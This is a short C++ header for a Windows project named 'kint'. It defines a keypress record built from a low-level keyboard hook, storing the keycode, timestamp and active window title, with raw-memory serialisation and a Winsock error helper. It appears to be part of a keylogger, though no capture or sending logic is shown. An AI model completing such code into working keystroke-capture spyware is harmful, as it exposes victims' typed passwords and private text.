#ifndef KINT_COMMON_HPP
#define KINT_COMMON_HPP

#include "pch.h"
#include <windows.h>
#include <string>
#include <chrono>

namespace kint_common {
    struct keypress_t {
        std::time_t timestamp;
        DWORD keycode;
        DWORD scancode;
        char window_title[128];
        char key;

        keypress_t(PKBDLLHOOKSTRUCT kbdInput, char* _window_title, char* _key) :
            keycode(kbdInput->vkCode),
            scancode(kbdInput->scanCode),
            key(*_key)
        {
            timestamp = std::chrono::duration_cast<std::chrono::seconds>(std::chrono::system_clock::now().time_since_epoch()).count();
            strncpy(window_title, _window_title, sizeof window_title);
        }

        char* as_raw_memory();
    };
    
    std::string WsaErrorToString(DWORD error);
    std::string ToHumanReadable(DWORD vk);
    bool IsHumanReadable(DWORD vk);
    int FromWcharToChar(WCHAR* in, char* out, int inSize);
};

#endif //KINT_COMMON_HPP
